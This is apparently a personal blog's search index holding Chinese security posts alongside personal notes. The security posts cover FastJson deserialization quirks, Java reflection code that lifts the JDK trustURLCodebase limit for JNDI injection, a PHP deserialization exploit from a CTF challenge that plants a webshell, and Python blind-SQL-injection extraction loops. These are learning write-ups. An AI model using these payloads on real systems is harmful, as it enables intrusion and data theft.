<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>FastJson中较少提到的特性</title>
      <link href="/2024/03/21/FastJson%E4%B8%AD%E8%BE%83%E5%B0%91%E6%8F%90%E5%88%B0%E7%9A%84%E7%89%B9%E6%80%A7/"/>
      <url>/2024/03/21/FastJson%E4%B8%AD%E8%BE%83%E5%B0%91%E6%8F%90%E5%88%B0%E7%9A%84%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h2 id="FastJson中一些较少提到的特性"><a href="#FastJson中一些较少提到的特性" class="headerlink" title="FastJson中一些较少提到的特性"></a>FastJson中一些较少提到的特性</h2><blockquote><p>都是23年11月左右自己看源码+调试测出来的特性，结果后来发现早两年就有人研究过Constructor的调用逻辑了（（（（（（</p><p>添加白名单绕过特性应该也挺早就被前人发现过，最终在22年下旬造成了最近的一次绕过</p></blockquote><h3 id="调用Constructor机制"><a href="#调用Constructor机制" class="headerlink" title="调用Constructor机制"></a>调用Constructor机制</h3><h4 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h4><p>目标类必须有**<code>默认方法</code><strong>，FastJson反序列化时也只会调用</strong><code>default-constructor</code>**</p><p>没有就报错，<strong>此时都没有缓存机制</strong></p><h4 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h4><p>开了AutoType后，利用缓存机制多打几次就可以打破默认构造方法的必要性限制</p><p>这样就能调用<strong>无参以外的构造方法</strong>了</p><p>然而有好几个限制点：</p><ul><li><p>如果目标类<strong>有默认构造方法</strong>，就不会调用有参构造方法</p></li><li><p>如果调用有参构造方法，就不会在反序列化阶段调用任何setter与getter</p></li><li><p>与Jackson不同，在FastJson中通过**<code>传String类型的参数</code><strong>来</strong><code>调用对应setter</code><strong>, <strong>不能</strong>自动做类型转换而调用setter的</strong>参数类** 的**<code>String类型的构造方法</code>**（这本来也不该能调用，我实在不知道为什么Jackson支持）</p><p>那么调用目标的什么构造方法呢？参照第一点，FastJson仍然会<strong>优先调用默认构造方法</strong>创建对象，并调用setter、getter，都不行就反射修改public属性来赋值</p><p>如果类压根没有这个属性（<strong>父类私有</strong>） 就去往上找父类，找到第一个有这个属性的父类就开始调用setter/getter/… <strong>最终会赋给子类</strong>就离谱（）</p></li></ul><p><strong>顺序</strong></p><ul><li><p>按照<code>getConstructors()</code>获取到的顺序，取第一位调用，这个过程甚至可能随机: <a href="https://zhuanlan.zhihu.com/p/535423876">https://zhuanlan.zhihu.com/p/535423876</a></p></li><li><p>顺序不受Json数据影响，假如有AB两个构造方法，其中A的参数是A1、A2，B的参数是B1、B2；传A1A2，如果B的顺序更先，它宁愿给B1B2初始化默认值，也不会调用A方法</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>相比于Jackson、Snakeyaml</p><p><strong>FastJson</strong>：</p><ul><li><p><strong>很难调用到想要的</strong>有参Constructor</p></li><li><p>若有一个不会被拦截的类，其中具有setXxxxx….(Classpath….)方法，且拥有Default-Constructor（如果用<strong>缓存绕过默认限制</strong>，会导致走不到借助settter实现的绕过逻辑），则Classpath…..可以蹭车<strong>通过checkAutoType</strong>    ——从而调用到对应的setter，不能调getter，但可以调指定有参构造方法，但也别忘了————</p><p><code>如果调用的是有参构造方法，就不会在反序列化阶段调用任何setter与getter</code></p></li></ul><p>第二点在[新思路](1.2.68 &amp; 1.2.80新思路.md)里有更详细的说明，具体可用于添加白名单缓存</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FastJson反序列化 Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈trustURLCodebase限制的解除</title>
      <link href="/2024/03/19/%E6%B5%85%E8%B0%88trustURLCodebase%E9%99%90%E5%88%B6%E7%9A%84%E8%A7%A3%E9%99%A4/"/>
      <url>/2024/03/19/%E6%B5%85%E8%B0%88trustURLCodebase%E9%99%90%E5%88%B6%E7%9A%84%E8%A7%A3%E9%99%A4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>大家都知道JDK高版本后，限制远程Reference加载的属性是<code>trustURLCodebase</code></p><p>但它其实没有看上去那么简单，具体限制<strong>分为两部分</strong></p><h3 id="系统属性"><a href="#系统属性" class="headerlink" title="系统属性"></a>系统属性</h3><p>第一个是可以用System.setProperty改的系统属性**<code>com.sun.jndi.ldap.object.trustURLCodebase</code>**</p><p>其带来的限制较前，而且会在目标控制台弹出警告</p><p><strong>什么是系统属性？</strong></p><p>使用System.setProperty </p><p>分别设置<code>com.sun.jndi.ldap.object.trustURLCodebase</code>/<code>com.sun.naming.internal.VersionHelper12</code> <strong>两个系统属性</strong>为ture</p><p>然而<code>com.sun.naming.internal.VersionHelper12</code>类实例属性仍然为false</p><p>系统属性是特殊的全局变量，和具体的类属性无关，也只能通过System.set/get…..的方式来设置/获取</p><h3 id="类私有属性"><a href="#类私有属性" class="headerlink" title="类私有属性"></a>类私有属性</h3><p>另一个是**<code>com.sun.naming.internal.VersionHelper12</code><strong>中的</strong><code>trustURLCodebase</code>**</p><p>由<code>private static final</code>修饰，<strong>String类型</strong>，初始化为**<code>com.sun.jndi.ldap.object.trustURLCodebase</code>**，Spring和Tomcat下，其类初始化发生在Web应用启动之时</p><p>最终影响loadClass是否生效，拦截到了也<strong>不会警告</strong>，只是默默地不从远程codebase加载类</p><h2 id="操纵之术"><a href="#操纵之术" class="headerlink" title="操纵之术"></a>操纵之术</h2><h3 id="系统属性-1"><a href="#系统属性-1" class="headerlink" title="系统属性"></a>系统属性</h3><p>有很多反序列化链都可以修改，具体可见：</p><p><strong>BCS2022-探索JNDI攻击 by浅蓝</strong></p><p><a href="https://github.com/iSafeBlue/presentation-slides/blob/main/BCS2022-%E6%8E%A2%E7%B4%A2JNDI%E6%94%BB%E5%87%BB.pdf">https://github.com/iSafeBlue/presentation-slides/blob/main/BCS2022-%E6%8E%A2%E7%B4%A2JNDI%E6%94%BB%E5%87%BB.pdf</a></p><p>然而单单改系统属性是不够的，<del>除非是Web应用初始化阶段就改掉</del></p><p>所以继续来看类私有属性</p><h3 id="类私有属性-1"><a href="#类私有属性-1" class="headerlink" title="类私有属性"></a>类私有属性</h3><p><code>VersionHelper12</code>里也没有setter，这个肯定只能反射改了</p><p>考虑以下两个问题</p><h4 id="static-final修改"><a href="#static-final修改" class="headerlink" title="static final修改"></a>static final修改</h4><p>针对这种情况，需要<strong>先去掉final修饰符</strong></p><p><strong>一种适用于 JDK8Java8 至 JDK17Java17 的反射修改 static final 属性的方法</strong></p><p><a href="https://blog.csdn.net/wu_weijie/article/details/129251045">https://blog.csdn.net/wu_weijie/article/details/129251045</a></p><h4 id="获取实例对象"><a href="#获取实例对象" class="headerlink" title="获取实例对象"></a>获取实例对象</h4><p>因为加载类的时候要用到，大概率是单例，打个断点，看看加载类的时候是从哪里拿到这个对象的</p><p>发现了如下方法调用</p><p><code>VersionHelper.getVersionHelper()</code></p><h2 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h2><p>由于要反射修改，所以只能在RCE（而且是动态代码执行上下文）条件下实现</p><p><strong>适用于LDAP，Java 8 ~ Java11</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.sun.naming.internal.VersionHelper12&quot;</span>);</span><br><span class="line"></span><br><span class="line">Field field = clazz.getDeclaredField(<span class="string">&quot;trustURLCodebase&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">Field modifiers = field.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">modifiers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">modifiers.setInt(field,field.getModifiers()&amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">field.set(VersionHelper.getVersionHelper(),<span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="应用场景-非常无用"><a href="#应用场景-非常无用" class="headerlink" title="应用场景#非常无用"></a>应用场景#<del>非常无用</del></h2><p>纯鸡肋: 在JDK高版本，利用具有动态代码执行上下文的反序列化漏洞，使得JNDI注入漏洞可以远程类加载</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JNDI注入 Java安全 娱乐知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈PHP命名空间对于反序列化漏洞利用的影响</title>
      <link href="/2023/04/09/%E6%B5%85%E8%B0%88PHP%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E5%AF%B9%E4%BA%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E5%BD%B1%E5%93%8D/"/>
      <url>/2023/04/09/%E6%B5%85%E8%B0%88PHP%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E5%AF%B9%E4%BA%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E5%BD%B1%E5%93%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>今天做了一道BUU上收录的2019强网杯upload，解题过程中拿到了题目源码，里面有个函数会对cookie进行反序列化，基本思路就是利用反序列化和源码中的魔术方法构造POP链进入upload_img函数绕过对上传文件的强制命名，从而拿到webshell</p><p>结果EXP都写好了，生成的字符串换到Cookie里面刷新却没能成功，找了别人的EXP过来对比自己也看不出哪里不一样，但是把别人的拿来用又行了，怎么会是呢？以下是我最开始写的EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$registed</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&#x27;./upload/f9e1016a5cec370aae6a18d438dabfa5/1741b019882cc15c136b1977bcd295bc.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;./upload/f9e1016a5cec370aae6a18d438dabfa5/shedsall.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span> = <span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Register();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>擦亮眼睛仔细对比后，我发现了自己写的EXP和别人的不同之处，他们的EXP开头都有一行代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br></pre></td></tr></table></figure><p>namespace的作用是分配命名空间，可以起到防止变量、函数、类名重复的效果，runoob上有一篇专门讲PHP中的命名空间的文章很不错：</p><p><a href="https://www.runoob.com/w3cnote/php-namespace-intro.html">https://www.runoob.com/w3cnote/php-namespace-intro.html</a></p><p>其中提到了当调用其它命名空间（如test）下的类名(如Register)时，需要使用<strong>\test\Register</strong> ：一种像文件路径的语法： <strong>\空间名\元素名</strong></p><p>而当我们用echo输出对EXP添加命名空间前后的序列化字符串时，也能发现其中的不同（上面的结果是不添加Namespace的，下面的反之）<img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20230409201602246.png" alt="image-20230409201602246" loading="lazy"></p><p>类名从<strong>Register</strong>变成了<strong>app\web\controller\Register</strong>，即<strong>\空间名\元素名</strong>的语法，所以说<strong>序列化后的字符串是会受到namespace影响的</strong>。</p><p>那么问题来了，为什么我们一定要添加这行代码声明命名空间才能执行成功呢？我翻了翻题目源码：<img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20230409202024875.png" alt="image-20230409202024875" loading="lazy"></p><p>原来是题目源码中规定好了这样的命名空间，所以也只有声明了同样命名空间的EXP才能生成有效的序列化字符串，不然类名都不同了。</p><p>这种疏忽完全来源于基础的薄弱……但是边做边学效率才是最高的，嗯…我认错但还是不改。</p><p>事情到这里就算告一段落，我写下这篇博客后也心满意足地看比赛去了~</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 PHP 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈SQL语句不区分大小写的特性与盲注脚本碰撞所产生的一个坑</title>
      <link href="/2023/02/13/%E6%B5%85%E8%B0%88SQL%E8%AF%AD%E5%8F%A5%E4%B8%8D%E5%8C%BA%E5%88%86%E5%A4%A7%E5%B0%8F%E5%86%99%E7%9A%84%E7%89%B9%E6%80%A7%E4%B8%8E%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%A2%B0%E6%92%9E%E6%89%80%E4%BA%A7%E7%94%9F%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9D%91/"/>
      <url>/2023/02/13/%E6%B5%85%E8%B0%88SQL%E8%AF%AD%E5%8F%A5%E4%B8%8D%E5%8C%BA%E5%88%86%E5%A4%A7%E5%B0%8F%E5%86%99%E7%9A%84%E7%89%B9%E6%80%A7%E4%B8%8E%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%A2%B0%E6%92%9E%E6%89%80%E4%BA%A7%E7%94%9F%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>众所周知，SQL语句是不区分大小写的，这个特性在方便开发人员的同时也便利了黑阔们进行一个简单的绕过（比如大小写绕WAF），但我们今天的主题不是bypass，而是这个特性与盲注脚本碰撞所产生的一个坑。</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>SQL不区分大小写，很多人可能会觉得：那又怎么样，不就是敲语句的时候方便些吗？然而这个特性直接造成’a’与’A’在SQL语句中是一样的，即’a’=’A’是成立的！</p><p><img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20230214111209552.png" alt="image-20230214111209552" loading="lazy"></p><p>而盲注脚本中用substr逐个取字母出来比对则会受到这个特性的影响，又因为ASCII码的顺序是先大写字母再小写字母，所以在以下代码中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, information_length + <span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>)</span><br><span class="line">    payload = <span class="string">f&#x27; and substr((select <span class="subst">&#123;column_name&#125;</span> from <span class="subst">&#123;table_name&#125;</span> limit <span class="subst">&#123;y-<span class="number">1</span>&#125;</span>,1),<span class="subst">&#123;j&#125;</span>,1)=%27chr(k)%27&#x27;</span></span><br><span class="line">new_url = base_url + payload</span><br><span class="line">    <span class="keyword">if</span> flag_text <span class="keyword">in</span> requests.get(new_url).text.encode(<span class="string">&#x27;utf-8&#x27;</span>).decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">            information_name = information_name + <span class="built_in">chr</span>(k)</span><br></pre></td></tr></table></figure><p>ASCII码从小到大不断用取k出来，拿chr(k)和substr出来的字段名字母进行比较，结果会得到全部为大写的字段名（毕竟只要满足条件就开始匹配下一个字母了）</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>想要解决其实也很简单，全部使用ASCII码进行比较就可以了~（而且二分法也会用到这个）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, information_length + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">                    payload = <span class="string">f&#x27; and ascii(substr((select <span class="subst">&#123;column_name&#125;</span> from <span class="subst">&#123;table_name&#125;</span> limit <span class="subst">&#123;y-<span class="number">1</span>&#125;</span>,1),<span class="subst">&#123;j&#125;</span>,1))=<span class="subst">&#123;k&#125;</span>&#x27;</span></span><br><span class="line">                    new_url = base_url + payload</span><br><span class="line">                    <span class="keyword">if</span> flag_text <span class="keyword">in</span> requests.get(new_url).text.encode(<span class="string">&#x27;utf-8&#x27;</span>).decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                        information_name = information_name + <span class="built_in">chr</span>(k)</span><br></pre></td></tr></table></figure><h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>摸了很久，所以接下来一周会多写几篇和SQL有关的博客（大概</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>SQL语句不区分大小写，但是数据库里的数据还是区分大小写的，也就是说，如果数据库里的表名是’flag’，在SQL语句中用where table_name=’Flag’ 的条件进行筛选，匹配不了数据库里的’flag’</p><p>我所说的SQL语句不区分大小写仅限于SQL语句中的判断条件，SQL语句认为’a’=’A’，用户输入的’flag’和’Flag’它只会原封不动地传给数据库进行比对，而在数据库里就有了区分~</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 SQL注入 python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>autopush</title>
      <link href="/2022/08/22/autopush/"/>
      <url>/2022/08/22/autopush/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>利用Github action，实现修改网站源代码后，自动执行生成静态页面＋部署改变到github pages的操作（无后端静态页面）  代码如下：</p><table><thead><tr><th>name: Hexo Deploy Automatically</th><th></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td>on:</td></tr><tr><td></td><td>push:</td></tr><tr><td></td><td>branches:</td></tr><tr><td></td><td>- hexo # 网站源码所在分支名称</td></tr><tr><td></td><td></td></tr><tr><td></td><td>pull_request:</td></tr><tr><td></td><td>branches:</td></tr><tr><td></td><td>- hexo # 网站源码所在分支名称</td></tr><tr><td></td><td></td></tr><tr><td></td><td>jobs:</td></tr><tr><td></td><td>build:</td></tr><tr><td></td><td></td></tr><tr><td></td><td>runs-on: ubuntu-latest</td></tr><tr><td></td><td></td></tr><tr><td></td><td>strategy:</td></tr><tr><td></td><td>matrix:</td></tr><tr><td></td><td>node-version: [16.x]</td></tr><tr><td></td><td></td></tr><tr><td></td><td>steps:</td></tr><tr><td></td><td>- name: Checkout</td></tr><tr><td></td><td>uses: actions/checkout@v2</td></tr><tr><td></td><td></td></tr><tr><td></td><td>- name: Use Node.js $NaN</td></tr><tr><td></td><td>uses: actions/setup-node@v1</td></tr><tr><td></td><td>with:</td></tr><tr><td></td><td>node-version: $NaN</td></tr><tr><td></td><td></td></tr><tr><td></td><td>- name: Generate</td></tr><tr><td></td><td>run: |</td></tr><tr><td></td><td>npm i &amp;&amp; npx hexo g</td></tr><tr><td></td><td></td></tr><tr><td></td><td>- name: Deploy</td></tr><tr><td></td><td>uses: peaceiris/actions-gh-pages@v3</td></tr><tr><td></td><td>with:</td></tr><tr><td></td><td>github_token: $</td></tr><tr><td></td><td>publish_branch: main # 静态页面代码(即部署在Github Pages上的代码)所在分支名称</td></tr><tr><td></td><td>publish_dir: ./public</td></tr><tr><td></td><td>force_orphan: true</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 技术 博客 自动部署 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>back</title>
      <link href="/2022/08/22/back/"/>
      <url>/2022/08/22/back/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>WHOCANSEE IS BACK</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>《图解HTTP》读书笔记</title>
      <link href="/2021/11/24/HTTP/"/>
      <url>/2021/11/24/HTTP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>先给出一个总的夸奖, <strong>这是一本对并不求根问底的技术小白来说绝佳的Web入门书籍</strong></p><p>再给出个人的评价, <strong>这是一本对求甚解的技术小白来说有点痛苦的Web入门书籍</strong> PS(如果你还未读过本书,请看到最后,我会给出个人的阅读建议)</p><p>why,这是这本书与此有关的几大特点:</p><ul><li>小结构(即每个大章节内部的分支)十分严谨清晰,大结构(即整书11个大章节的关系)较为丰富(<strong>是说有点混乱</strong>)   具体来说, 本书除了讲解HTTP以外,还涉及了简单的Web知识(如HTML CSS等构建Web页面内容的技术 如基于表单的Web应用认证 如常见的Web攻击技术) 事实上,本书的一大侧重点就是Web安全方面的内容,所以如果你已经对这方面内容有了初步概念,或是对此感兴趣,这本《图解HTTP》还是非常适合你的</li><li>部分内容的翻译<strong>令人汗颜</strong>, 首先本书是没有严重的翻译错误的, 译者的专业身份(上海交通大学硕士)也为这点提供了有力保障,但我不知是否日文书译作中文时存在无法避免的难题,本书中出现了很多语法十分怪异的句子,乍一看我竟理解不了**”某些短语究竟是定语还是宾语** “<strong>这个句子的主干是什么?”</strong> 并且有几处已经严重影响到了我对于HTTP协议一些关键部分的理解,后经过前后文比对推断和查阅资料后才弄明白那些句子究竟想表达什么,如果各位对书中某些地方有疑问也可以联系我的电邮.</li><li>本书内容是很全面的,甚至对有些比较复杂深入的内容也进行了介绍(比如认证那节),这其实和本书的入门定位产生了冲突,因为要求了许多前置知识(<strong>事实上大部分都会在后面的章节提到</strong>)很多地方我刚开始看的迷迷糊糊,查阅资料也一知半解,顿时产生了消极情绪,开始自我怀疑(毕竟这只是本入门技术书籍,如果连这本书都看不太懂,那我的水平似乎是过低了)后来断断续续的往后看了下去,在了解了后续某些关键内容后<strong>顿觉豁然开朗</strong>,并且懊悔自己在本书前面部分内容耽误了太多时间,现在回过头乐观想想,阅读这本书的过程也提示了我  <strong>先粗略浏览建立整体认识,再于实战中遇到问题时不断返回细致学习   的高效率学习新知识方法</strong>,实在是很有意义.</li></ul><p><strong>最后的话</strong></p><p>​    本篇笔记写到最后,自然不会是感言之类的话. 我简单给出这本书的阅读建议吧</p><ul><li>什么样的人适合阅读这本书?<ul><li>对计算机网络 协议 Web HTTP 感兴趣的同学</li><li>计算机大类专业的同学</li><li>零基础或少基础的技术小白</li><li>没有系统学习过HTTP的同学</li></ul></li><li>如何高效地通过这本《图解HTTP》来学习HTTP相关知识?<ul><li>先用3天粗略读过,遇到不解的地方做上标记,在大量罗列首部及其对应作用的部分略过,对HTTP建立起整体印象.</li><li>回过头看看不解的地方,此时还没想通的部分优先在脑海中搜寻答案,想想这本书中是否就已经具有了解答,如果实在不解再试着使用搜索引擎或技术论坛/社群,若是问题较为复杂也可放弃,毕竟牵涉到的有些内容是属于另一需要循序渐进学习的领域,现在理解不了也正常.</li><li>实践,通过wireshark或浏览器开发者模式下Ctrl+R进行抓包,尝试读懂数据包各项指标的含义,遇见不明白的地方同第二点解决方法.</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VS 2022的一次错误</title>
      <link href="/2021/10/17/%E4%B8%80%E6%AC%A1%E9%97%AE%E9%A2%98/"/>
      <url>/2021/10/17/%E4%B8%80%E6%AC%A1%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>七星最近听说VS 2022预览版出了,我果断下载尝鲜,结果遇到了这样的问题:</p><p>#include &lt;stdio.h&gt; 报错 提示C1083:无法打开包括文件 &lt;stdio.h&gt;</p><p>解决方法很简单,退回VS2019(bushi)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>whocansee 个人介绍</title>
      <link href="/2021/09/27/whocansee/"/>
      <url>/2021/09/27/whocansee/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>小伙伴,你好啊,欢迎来到我的博客,请容我介绍一下自己~</p><p>我本名HJW,ID为whocansee,在网上冲浪有时也会用 『七星』作为自己的昵称</p><p>SEC,Coding是兴趣,课业是工作,二者合起来的学业就是我苦逼的一周TAT</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一日重返</title>
      <link href="/2021/09/27/%E8%AE%B0%E4%B8%80%E6%97%A5%E9%87%8D%E8%BF%94/"/>
      <url>/2021/09/27/%E8%AE%B0%E4%B8%80%E6%97%A5%E9%87%8D%E8%BF%94/</url>
      
